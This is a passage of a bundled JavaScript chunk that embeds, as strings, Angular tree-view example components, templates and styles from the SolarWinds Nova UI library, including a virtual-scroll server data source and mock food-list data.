(click)="onToggleClick(node, nestedNode)"\n                cdkTreeNodeToggle\n            >\n                <nui-icon\n                    class="nui-tree__header-icon"\n                    icon="{{\n                        treeControl.isExpanded(node)\n                            ? \'triangle-down\'\n                            : \'triangle-right\'\n                    }}"\n                ></nui-icon>\n                <span class="nui-tree__header-title">{{ node.name }}</span>\n            </div>\n            <div\n                class="nui-tree__body"\n                [class.nui-tree__body--collapsed]="\n                    !treeControl.isExpanded(node)\n                "\n                [@expandedState]="\n                    treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n                "\n            >\n                <div nui-busy [busy]="node.isLoading" style="min-height: 20px">\n                    <ng-container cdkTreeNodeOutlet></ng-container>\n                    <a\n                        *ngIf="node.hasChildren && nodesTotalItems[node.name]"\n                        class="nui-tree__show-all"\n                        (click)="showAll(node)"\n                        >Show All ({{ nodesTotalItems[node.name] }})</a\n                    >\n                </div>\n            </div>\n        </cdk-nested-tree-node>\n    </cdk-tree>\n</div>\n'},7469:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport {\n    CdkNestedTreeNode,\n    CdkTree,\n    NestedTreeControl,\n} from "@angular/cdk/tree";\nimport { HttpClient, HttpParams } from "@angular/common/http";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    Inject,\n    Injectable,\n    Input,\n    IterableDiffer,\n    IterableDiffers,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport isEqual from "lodash/isEqual";\nimport isNil from "lodash/isNil";\nimport { firstValueFrom, Observable, of, Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { catchError, delay, map, take, takeUntil, tap } from "rxjs/operators";\n\nimport {\n    DataSourceService,\n    DialogService,\n    DOCUMENT_CLICK_EVENT,\n    EventBusService,\n    expand,\n    IDataSource,\n    IFilter,\n    IFilteringOutputs,\n    INovaFilteringOutputs,\n    INovaFilters,\n    IRepeatItemConfig,\n    LoggerService,\n    nameof,\n    NuiActiveDialog,\n    NuiDialogRef,\n    Paginator,\n    Repeat,\n    RepeatComponent,\n    VirtualViewportManager,\n} from "@nova-ui/bits";\n\ninterface IServerNode extends Partial<IServer> {\n    name: string;\n    hasChildren?: boolean;\n    isLoading?: boolean;\n    children?: IServerNode[];\n}\n\nexport enum ServerStatus {\n    active = "Active",\n    down = "Down",\n}\n\n// implement custom filters\nexport interface IServerFilters extends INovaFilters {\n    location?: IFilter<string>;\n    name?: IFilter<string>;\n    status?: IFilter<ServerStatus>;\n}\n\n// collection of items that we\'ve transformed from the backend API\nexport interface IServersCollection {\n    items: IServer[];\n    count: number;\n    status?: IFilter<Record<string, number>>;\n    location?: IFilter<Record<string, number>>;\n}\n\n// main server model being received from the backend\nexport interface IServer {\n    location: string;\n    name: string;\n    status: ServerStatus;\n}\n// collection of items that we\'ve received from the backend API response\nexport interface IServersApiResponse {\n    count: number;\n    items: IServer[];\n}\n\nconst TREE_DATA: IServerNode[] = [\n    {\n        name: "Nodes",\n        hasChildren: true,\n        children: [\n            {\n                name: "Brno",\n                hasChildren: true,\n                children: [],\n            },\n            {\n                name: "Austin",\n                hasChildren: true,\n                children: [],\n            },\n            {\n                name: "Kyiv",\n                hasChildren: true,\n                children: [],\n            },\n        ],\n    },\n];\n\nconst RESULTS_PER_PAGE = 25;\n\nexport const API_URL = "https://nova-pg.swdev.local/api/v1/servers";\n\n/**\n * Example of a ServerSide DataSourceService which is using the Nova Backend API\n * to fetch data\n */\n@Injectable()\nexport class VirtualScrollListDataSource<T = any>\n    extends DataSourceService<T>\n    implements IDataSource\n{\n    // cache used to store our previous fetched results while scrolling\n    // and more data is automatically fetched from the backend\n    private cache = Array.from<IServer>({ length: 0 });\n    private previousFilters: INovaFilters;\n\n    constructor(private logger: LoggerService, private http: HttpClient) {\n        super();\n    }\n\n    public async getFilteredData(\n        filters: INovaFilters\n    ): Promise<INovaFilteringOutputs> {\n        // Every new search request or filter change should\n        // clear the cache in order to correctly display a new set of data\n        const reset = this.filtersChanged(\n            filters,\n            nameof<IServerFilters>("status"),\n            nameof<IServerFilters>("location"),\n            nameof<IServerFilters>("search"),\n            nameof<IServerFilters>("sorter")\n        );\n\n        if (reset || filters.virtualScroll?.value.start === 0) {\n            this.cache = [];\n        }\n        return firstValueFrom(\n            this.getBackendData(filters).pipe(\n                // eslint-disable-next-line import/no-deprecated\n                tap((response: IServersCollection) => {\n                    // after receiving data we need to append it to our previous fetched results\n                    this.cache = this.cache.concat(response.items);\n                }),\n                // eslint-disable-next-line import/no-deprecated\n                map((response: IServersCollection) => {\n                    const itemsSource = this.cache;\n\n                    return {\n                        repeat: { itemsSource: itemsSource },\n                        paginator: {\n                            total: response.count,\n                        },\n                    };\n                })\n            )\n        );\n    }\n\n    public reset(): void {\n        this.cache = [];\n    }\n\n    // build query params specific to our backend API\n    private getRequestParams(filters: INovaFilters): HttpParams {\n        const paging = filters.virtualScroll?.value ?? { start: 0, end: 0 };\n        const params = new HttpParams()\n            // define the start page used by the virtual scroll internal "paginator"\n            .set("page", Math.ceil(paging.start / RESULTS_PER_PAGE).toString())\n            // specify the maximum number of items we need to fetch for each request\n            .set("pageSize", String(RESULTS_PER_PAGE))\n            .set("searchField", "location")\n            .set("searchContent", filters.search?.value ?? "");\n\n        return params;\n    }\n\n    private getBackendData(\n        filters: INovaFilters\n    ): Observable<IServersCollection> {\n        // fetch response from the backend\n        const requestParams = this.getRequestParams(filters);\n        return this.http\n            .get<IServersApiResponse>(API_URL, { params: requestParams })\n            .pipe(\n                delay(300),\n                // eslint-disable-next-line import/no-deprecated\n                map((response) => ({\n                    items:\n                        response.items?.map((item) => ({\n                            name: item.name,\n                            location: item.location,\n                            status: item.status,\n                        })) || [],\n                    count: response.count,\n                })),\n                catchError((e) => {\n                    this.logger.error(e);\n                    return of({\n                        items: [],\n                        count: 0,\n                    });\n                })\n            );\n    }\n\n    // checks if any of the filters specified by name have changed from the previous evaluation\n    public filtersChanged(\n        filters: INovaFilters,\n        ...filterNames: string[]\n    ): boolean {\n        for (let i = 0; i < filterNames.length; i++) {\n            const filterName = filterNames[i];\n            const filter = filters[filterName];\n            if (\n                !isNil(filter?.value) &&\n                this.previousFilters &&\n                !isEqual(filter?.value, this.previousFilters[filterName]?.value)\n            ) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n}\n\n@Component({\n    selector: "nui-tree-show-all-dialog-example",\n    templateUrl: "./tree-show-all-dialog.example.component.html",\n    styleUrls: ["./tree-show-all-dialog.component.example.less"],\n    animations: [expand],\n    providers: [VirtualScrollListDataSource],\n})\nexport class TreeShowAllDialogExampleComponent implements OnDestroy {\n    private activeDialogRef: NuiDialogRef;\n    private get activeDialogComponent(): TreeDialogContentExampleComponent {\n        return this.activeDialogRef.componentInstance;\n    }\n    private destroy$ = new Subject<void>();\n    @ViewChild(CdkTree) private cdkTree: CdkTree<IServerNode>;\n\n    public nodesTotalItems: { [key: string]: number } = {};\n\n    public treeControl = new NestedTreeControl<IServerNode>(\n        (node) => node.children\n    );\n    public dataSource = new ArrayDataSource(TREE_DATA);\n\n    public hasChild = (_: number, node: IServerNode): boolean =>\n        !!node.children;\n\n    constructor(\n        private virtualScrollListDataSource: VirtualScrollListDataSource,\n        private differ: IterableDiffers,\n        private eventBusService: EventBusService,\n        private dialogService: DialogService\n    ) {}\n\n    public showAll(node: IServerNode): void {\n        // setup the Dialog\n        this.activeDialogRef = this.dialogService.open(\n            TreeDialogContentExampleComponent,\n            { size: "sm" }\n        );\n        // pass the inputs to the context component\n        this.activeDialogComponent.items = [];\n        this.activeDialogComponent.isLoading = true;\n        this.activeDialogComponent.cdRef.detectChanges();\n\n        // Set location search criteria\n        this.setDsSearchFieldFor(node);\n        this.subscribeToDialogScrolling();\n\n        this.activeDialogRef.closed$.subscribe(() => {\n            this.virtualScrollListDataSource.deregisterComponent(\n                "virtualScroll"\n            );\n            this.virtualScrollListDataSource.deregisterComponent("search");\n            this.virtualScrollListDataSource.reset();\n        });\n    }\n\n    /**\n     * Register the viewport container to the DataSource\n     */\n    private subscribeToDialogScrolling() {\n        // \'setTimeout\' to wait until the dialog is rendered\n        setTimeout(() => {\n            const viewPortManager = this.activeDialogComponent.viewPortManager;\n\n            this.virtualScrollListDataSource.registerComponent({\n                virtualScroll: { componentInstance: viewPortManager },\n            });\n\n            viewPortManager\n                .observeNextPage$({ pageSize: RESULTS_PER_PAGE })\n                .pipe(takeUntil(this.destroy$))\n                .subscribe(() => {\n                    this.virtualScrollListDataSource.applyFilters();\n                    this.virtualScrollListDataSource.outputsSubject.subscribe(\n                        (v) => {\n                            if (!this.activeDialogComponent) {\n                                return;\n                            } // in case dialog was closed early\n                            const items = v.repeat.itemsSource as IServer[];\n                            this.activeDialogComponent.items = items;\n                            this.activeDialogComponent.isLoading = false;\n                            this.activeDialogComponent.cdRef.detectChanges();\n                        }\n                    );\n                });\n        });\n    }\n\n    /** Load first page on first open */\n    public onToggleClick(\n        node: IServerNode,\n        nestedNode: CdkNestedTreeNode<any>\n    ): void {\n        this.eventBusService\n            .getStream(DOCUMENT_CLICK_EVENT)\n            .next(new MouseEvent("click"));\n\n        if (node.hasChildren && node.children && !node.children.length) {\n            node.isLoading = true;\n            this.setDsSearchFieldFor(node);\n            this.virtualScrollListDataSource.applyFilters();\n            this.virtualScrollListDataSource.outputsSubject\n                .pipe(take(1))\n                .subscribe((v: IFilteringOutputs) => {\n                    const repeat = v.repeat as Repeat;\n                    const paginator = v.paginator as Paginator;\n\n                    const items: IServer[] = repeat.itemsSource;\n                    const total: number = paginator.total;\n\n                    this.handleNodeTotalItems(node.name, total);\n                    this.handleNodeContent(node, nestedNode, items);\n                    node.isLoading = false;\n                    this.virtualScrollListDataSource.deregisterComponent(\n                        "search"\n                    );\n                });\n        }\n    }\n\n    private handleNodeTotalItems(nodeId: string, totalItems: number) {\n        this.nodesTotalItems[nodeId] = totalItems;\n    }\n\n    private handleNodeContent(\n        node: IServerNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>,\n        items: IServerNode[]\n    ) {\n        node.children = [];\n        const differ: IterableDiffer<IServerNode> = this.differ\n            .find(node.children)\n            .create();\n        node.children = items;\n\n        // clear previously rendered leaf nodes\n        nestedNodeDirective.nodeOutlet.first.viewContainer.clear();\n        this.cdkTree.renderNodeChanges(\n            node.children,\n            differ,\n            nestedNodeDirective.nodeOutlet.first.viewContainer,\n            node\n        );\n    }\n\n    /** Register node name as a search to get nodes of one location */\n    private setDsSearchFieldFor(node: IServerNode) {\n        this.virtualScrollListDataSource.registerComponent({\n            search: {\n                componentInstance: {\n                    getFilters: () => ({\n                        type: "search",\n                        value: node.name,\n                    }),\n                },\n            },\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n\n@Component({\n    selector: "nui-dialog-content-dialog-example",\n    template: `\n        <nui-dialog-header\n            title="Dialog title"\n            i18n-title\n            (closed)="close()"\n        ></nui-dialog-header>\n\n        <div nui-busy [busy]="isLoading">\n            <div class="d-flex flex-row">\n                <nui-repeat\n                    class="virtual-scroll-list-repeat"\n                    [itemConfig]="itemConfig"\n                    [repeatItemTemplateRef]="repeatItemTemplate"\n                    [itemsSource]="items"\n                    [virtualScroll]="true"\n                    [itemSize]="30"\n                ></nui-repeat>\n            </div>\n        </div>\n\n        <nui-dialog-footer>\n            <button nui-button type="button" (click)="close()" i18n>\n                Close\n            </button>\n        </nui-dialog-footer>\n\n        <ng-template #repeatItemTemplate let-item="item">\n            <div class="d-flex justify-content-between w-100">\n                <span>Node: {{ item.name }}</span>\n                <span> Status: {{ item.status }}</span>\n            </div>\n        </ng-template>\n    `,\n    animations: [],\n    providers: [VirtualViewportManager],\n    styles: [\n        `\n            .virtual-scroll-list-repeat {\n                /* height has to be defined if using \'nui-repeat\' with virtual scroll */\n                height: 400px;\n            }\n        `,\n    ],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TreeDialogContentExampleComponent implements AfterViewInit {\n    @Input() items: IServerNode[] = [];\n    @Input() isLoading: boolean = false;\n\n    public itemConfig: IRepeatItemConfig = {\n        trackBy: (index: number, item: IServerNode): string | undefined =>\n            item?.name,\n    };\n\n    @ViewChild(RepeatComponent)\n    public repeat: RepeatComponent;\n\n    constructor(\n        public cdRef: ChangeDetectorRef,\n        public viewPortManager: VirtualViewportManager,\n        @Inject(NuiActiveDialog) public activeDialog: any\n    ) {}\n\n    public ngAfterViewInit(): void {\n        this.viewPortManager.setViewport(this.repeat.viewportRef);\n    }\n\n    close(): void {\n        this.activeDialog.close();\n    }\n}\n'},73913:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        <nui-icon\n            class="nui-tree__icon"\n            *ngIf="node.icon"\n            [icon]="node.icon"\n        ></nui-icon>\n        <span class="{{ node.textStyle || textStyles.DEFAULT }}">{{\n            node.name\n        }}</span>\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div class="nui-tree__header" cdkTreeNodeToggle>\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <nui-icon\n                class="nui-tree__icon"\n                *ngIf="node.icon"\n                [icon]="node.icon"\n            ></nui-icon>\n            <span\n                i18n\n                class="nui-tree__header-title {{\n                    node.textStyle || textStyles.LABEL\n                }}"\n                >{{ node.name }}</span\n            >\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <ng-container cdkTreeNodeOutlet></ng-container>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},7525:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},29333:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport { NestedTreeControl } from "@angular/cdk/tree";\nimport { Component } from "@angular/core";\n\nimport { expand } from "@nova-ui/bits";\n\ninterface FoodNode {\n    name: string;\n    textStyle?: string;\n    icon?: string;\n    children?: FoodNode[];\n}\n\nenum TextStyle {\n    DEFAULT = "nui-text-default",\n    SECONDARY = "nui-text-secondary",\n    LABEL = "nui-text-label",\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Custom Icons",\n        textStyle: "default",\n        icon: "email",\n        children: [\n            { name: "Apple", icon: "move-down" },\n            { name: "Carambola", icon: "add" },\n            { name: "Grapefruit", icon: "schedule" },\n        ],\n    },\n    {\n        name: "Custom Text Styles",\n        textStyle: TextStyle.SECONDARY,\n        children: [\n            {\n                name: "Green",\n                textStyle: TextStyle.DEFAULT,\n                children: [\n                    { name: "Broccoli", textStyle: TextStyle.LABEL },\n                    {\n                        name: "Brussels sprouts",\n                        textStyle: TextStyle.SECONDARY,\n                    },\n                ],\n            },\n            {\n                name: "Orange",\n                children: [\n                    { name: "Pumpkins" },\n                    { name: "Carrots", textStyle: TextStyle.SECONDARY },\n                ],\n            },\n            { name: "Red", textStyle: TextStyle.LABEL },\n        ],\n    },\n];\n\n@Component({\n    selector: "nui-tree-styling-example",\n    templateUrl: "tree-styling.example.component.html",\n    styleUrls: ["tree-styling.example.component.less"],\n    animations: [expand],\n})\nexport class TreeStylingExampleComponent {\n    treeControl = new NestedTreeControl<FoodNode>((node) => node.children);\n    dataSource = new ArrayDataSource(TREE_DATA);\n    textStyles: typeof TextStyle = TextStyle;\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.children?.length;\n}\n'},6356:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Injectable } from "@angular/core";\nimport { Observable, of } from "rxjs";\nimport { delay } from "rxjs/operators";\n\nexport interface FoodNode {\n    name: string;\n    page?: number;\n    children?: FoodNode[];\n    isLoading?: boolean;\n    hasPagination?: boolean;\n}\n\nexport interface IApiResponse {\n    items: FoodNode[];\n    total: number;\n}\n\n@Injectable()\nexport class HttpMock {\n    private fruitsList = [\n        $localize`apple`,\n        $localize`orange`,\n        $localize`banana`,\n        $localize`watermelon`,\n        $localize`peach`,\n        $localize`pineapple`,\n        $localize`lemon`,\n        $localize`mango`,\n    ];\n    private vegetablesList = [\n        $localize`tomato`,\n        $localize`cucumber`,\n        $localize`cabbage`,\n        $localize`pepper`,\n        $localize`carrot`,\n        $localize`onion`,\n        $localize`broccoli`,\n        $localize`corn`,\n    ];\n\n    private totalItems = 1337;\n\n    getNodeItems(\n        nodeId: string,\n        page: number,\n        pageSize: number\n    ): Observable<IApiResponse> {\n        // nodeId can be handled on API depending on app needs\n        const itemList =\n            nodeId === "Vegetables" ? this.vegetablesList : this.fruitsList;\n\n        const totalItemList = this.getTotalItemList(\n            itemList,\n            this.totalItems / itemList.length\n        );\n\n        const items: FoodNode[] = Array.from({ length: pageSize }).map(\n            (i, ind) => ({\n                name: totalItemList[ind],\n                page,\n            })\n        );\n\n        const response = {\n            items,\n            total: this.totalItems,\n        };\n        return of(response).pipe(delay(1000));\n    }\n\n    private getTotalItemList(list: any[], times: number) {\n        const totalArray = [];\n        for (let i = 0; i < times; i++) {\n            totalArray.push(...list);\n        }\n        return totalArray;\n    }\n}\n\nexport const TREE_DATA_PAGINATOR: FoodNode[] = [\n    {\n        name: "Food",\n        children: [\n            {\n                name: "Vegetables",\n                children: [],\n                hasPagination: true,\n            },\n            {\n                name: "Fruits",\n                children: [],\n                hasPagination: true,\n            },\n        ],\n    },\n];\n\nexport const TREE_DATA: FoodNode[] = [\n    {\n        name: "Fruit",\n        children: [\n            { name: "Apple" },\n            { name: "Banana" },\n            { name: "Fruit loops" },\n        ],\n    },\n    {\n        name: "Vegetables",\n        children: [\n            {\n                name: "Green",\n                children: [{ name: "Broccoli" }, { name: "Brussels sprouts" }],\n            },\n            {\n                name: "Orange",\n                children: [{ name: "Pumpkins" }, { name: "Carrots" }],\n            },\n            {\n                name: "Red",\n            },\n        ],\n    },\n    {\n        name: "Meat",\n    },\n];\n\nexport const TREE_DATA_CHECKBOX: FoodNode[] = [\n    {\n        name: "Vegetables",\n        children: [\n            {\n                name: "Green",\n                children: [{ name: "Broccoli" }, { name: "Brussels sprouts" }],\n            },\n            {\n                name: "Orange",\n                children: [{ name: "Pumpkins" }, { name: "Carrots" }],\n            },\n            {\n                name: "Red",\n            },\n        ],\n    },\n    {\n        name: "Fruit",\n        children: [\n            { name: "Apple" },\n            { name: "Banana" },\n            { name: "Fruit loops" },\n        ],\n    },\n    {\n        name: "Meat",\n    },\n];\n'},13624:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree\n    [@.disabled]="true"\n    [dataSource]="dataSource"\n    [treeControl]="treeControl"\n>\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        {{ node.name }}\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div class="nui-tree__header" cdkTreeNodeToggle>\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <span class="nui-tree__header-title">{{ node.name }}</span>\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <ng-container cdkTreeNodeOutlet></ng-container>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},20688:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},61e3:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport { NestedTreeControl } from "@angular/cdk/tree";\nimport { Component } from "@angular/core";\n\nimport { expand } from "@nova-ui/bits";\n\nimport { FoodNode, TREE_DATA } from "../data";\n\n@Component({\n    selector: "nui-tree-basic-test",\n    templateUrl: "./tree-basic-test.component.html",\n    styleUrls: ["./tree-basic-test.component.less"],\n    host: { id: "nui-tree-basic-example" },\n    animations: [expand],\n})\nexport class TreeBasicTestComponent {\n    treeControl = new NestedTreeControl<FoodNode>((node) => node.children);\n    dataSource = new ArrayDataSource(TREE_DATA);\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.children?.length;\n}\n'},31440:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex justify-content-between">\n    <cdk-tree\n        [@.disabled]="true"\n        [dataSource]="dataSource"\n        [treeControl]="treeControl"\n        style="flex: 50%"\n    >\n        <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n            <button\n                nui-button\n                displayStyle="action"\n                type="button"\n                disabled\n            ></button>\n            <nui-checkbox\n                class="leaf-control"\n                [checked]="selectionModel.isSelected(node)"\n                (valueChange)="leafItemSelectionToggle(node)"\n                >{{ node.name }}</nui-checkbox\n            >\n        </cdk-nested-tree-node>\n        <cdk-nested-tree-node\n            *cdkTreeNodeDef="let node; when: hasChild"\n            class="nui-tree"\n        >\n            <div class="nui-tree__header" cdkTreeNodeToggle>\n                <nui-icon\n                    class="nui-tree__header-icon"\n                    icon="{{\n                        treeControl.isExpanded(node)\n                            ? \'triangle-down\'\n                            : \'triangle-right\'\n                    }}"\n                ></nui-icon>\n                <nui-checkbox\n                    class="branch-control"\n                    (click)="$event.stopPropagation()"\n                    [checked]="descendantsAllSelected(node)"\n                    [indeterminate]="descendantsPartiallySelected(node)"\n                    (valueChange)="branchItemSelectionToggle(node)"\n                    >{{ node.item }}</nui-checkbox\n                >\n                <span class="nui-tree__header-title">{{ node.name }}</span>\n            </div>\n            <div\n                class="nui-tree__body"\n                [class.nui-tree__body--collapsed]="\n                    !treeControl.isExpanded(node)\n                "\n                [@expandedState]="\n                    treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n                "\n            >\n                <ng-container cdkTreeNodeOutlet></ng-container>\n            </div>\n        </cdk-nested-tree-node>\n    </cdk-tree>\n</div>\n'},95432:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n}\n'},38800:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource, SelectionModel } from "@angular/cdk/collections";\nimport { NestedTreeControl } from "@angular/cdk/tree";\nimport { Component } from "@angular/core";\n\nimport { expand } from "@nova-ui/bits";\n\nimport { FoodNode, TREE_DATA_CHECKBOX } from "../data";\n\n@Component({\n    selector: 